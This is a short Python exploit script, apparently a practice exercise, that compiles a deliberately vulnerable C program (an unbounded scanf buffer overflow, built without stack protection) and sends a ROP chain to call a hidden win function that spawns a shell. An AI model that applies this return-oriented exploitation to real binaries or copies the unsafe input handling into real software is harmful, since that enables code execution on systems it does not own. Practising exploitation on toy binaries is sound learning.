from ptrlib import *


def main():
    """

```
<< EOF cat | gcc -no-pie -fno-stack-protector -o easy -x c -
#include <stdio.h>
#include <stdlib.h>

__attribute__((naked)) void pop_rdi_ret() {
    __asm__("pop %rdi; ret");
}

void win(unsigned int key) {
    if (key == 0xdeadbeef) {
        system("/bin/sh");
    } else {
        puts("You are not allowed to access this function.\n");
    }
}

int main(void) 
{
    char buf[30];
    scanf("%s", buf);
    puts(buf);
    return 0;
}
// gcc easy.c -fno-stack-protector -no-pie -o easy
EOF
uv run rop/rop_easy.py
```
    """
    elf = ELF("./easy")
    proc = Process("./easy")

    input()
    payload = b'p' * 8 * 5
    payload += p64(next(elf.gadget("pop rdi; ret")))
    payload += p64(0xdeadbeef)
    payload += p64(elf.symbol("win"))
    proc.sendline(payload)
    proc.interactive()


if __name__ == "__main__" :
    main()

